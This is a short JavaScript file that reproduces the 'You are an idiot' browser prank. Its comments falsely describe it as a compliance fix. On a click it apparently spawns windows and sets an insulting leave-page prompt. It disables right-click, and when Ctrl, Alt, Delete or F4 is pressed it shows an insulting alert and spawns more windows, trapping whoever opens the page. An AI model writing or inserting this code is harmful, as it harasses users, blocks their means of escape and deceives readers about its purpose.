/* 
 * [Aug 2023] Fixed addEventListener for the document container.
 * [Oct 2021] Added to comply with strict browser policies.
 *
 * Requires safe.js & math.js preload.
 */
container.addEventListener('click', async () => {
	await proCreate(6);
	window.onbeforeunload = () => "Are you an idiot?";
});

window.onload = playBall;
window.oncontextmenu = () => false;

window.onkeydown = function() {	
	var keyCode = event.keyCode;
	
	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
    	alert("You are an idiot!");
		proCreate();
	}
	
	return null;
}
/* [Aug 2023] End of amendments. */
